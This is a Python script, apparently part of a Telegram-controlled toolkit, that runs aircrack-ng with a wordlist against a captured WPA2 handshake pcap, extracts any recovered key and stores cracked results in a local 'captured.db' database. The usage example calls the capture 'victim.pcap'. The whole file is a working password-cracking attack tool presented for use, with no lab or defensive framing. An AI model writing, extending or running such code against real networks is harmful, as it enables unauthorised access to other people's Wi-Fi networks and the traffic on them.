#!/usr/bin/env python3
"""
mt2_crack.py — Crack WPA2 handshake with aircrack-ng.
User (via Telegram) provides:
  - pcap file path
  - target SSID (optional, helps filter)
"""
import sys, subprocess, time
from pathlib import Path

WORDLIST = Path("/sdcard/MT2/wordlist.txt")
CAPTURE_DIR = Path("/sdcard/MT2/captures")

def crack(pcap_path, ssid=None):
    pcap = Path(pcap_path)
    if not pcap.exists():
        # Try relative to captures dir
        pcap = CAPTURE_DIR / pcap_path
    if not pcap.exists():
        print(f"[!] pcap not found: {pcap_path}")
        return None
    if not WORDLIST.exists():
        print(f"[!] wordlist not found: {WORDLIST}")
        return None
    cmd = ["aircrack-ng", "-w", str(WORDLIST)]
    if ssid:
        cmd += ["-e", ssid]
    cmd.append(str(pcap))
    print(f"[*] running: {' '.join(cmd)}")
    print(f"[*] wordlist: {WORDLIST} ({sum(1 for _ in WORDLIST.open())} lines)")
    print(f"[*] pcap: {pcap} ({pcap.stat().st_size} bytes)")
    print(f"[*] this may take a few minutes...\n")
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        out = r.stdout + r.stderr
        print(out)
        # Parse result
        if "KEY FOUND" in out:
            for line in out.split("\n"):
                if "KEY FOUND" in line:
                    key = line.split("[")[-1].split("]")[0]
                    return key
        return None
    except subprocess.TimeoutExpired:
        print("[!] timeout (10 min). Try a smaller wordlist or specific SSID.")
        return None
    except FileNotFoundError:
        print("[!] aircrack-ng not installed")
        return None

def main():
    if len(sys.argv) < 2:
        print("usage: mt2_crack.py <pcap> [ssid]")
        print("example: mt2_crack.py /sdcard/MT2/captures/victim.pcap MyWiFi")
        return
    pcap = sys.argv[1]
    ssid = sys.argv[2] if len(sys.argv) > 2 else None
    key = crack(pcap, ssid)
    if key:
        print(f"\n[+] CRACKED: {key}")
        # Save to db
        import sqlite3
        con = sqlite3.connect("/sdcard/MT2/captured.db")
        con.execute("""CREATE TABLE IF NOT EXISTS handshakes(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ts INTEGER, ssid TEXT, bssid TEXT, pcap_path TEXT, cracked INTEGER
        )""")
        con.execute("""INSERT INTO handshakes(ts,ssid,bssid,pcap_path,cracked)
            VALUES(?,?,?,?,?)""", (int(time.time()), ssid or "?", "?", pcap, 1))
        con.commit()
        con.close()
        print(f"[+] saved to /sdcard/MT2/captured.db")
    else:
        print(f"\n[-] not cracked. try a bigger wordlist or different attack.")

if __name__ == "__main__":
    main()
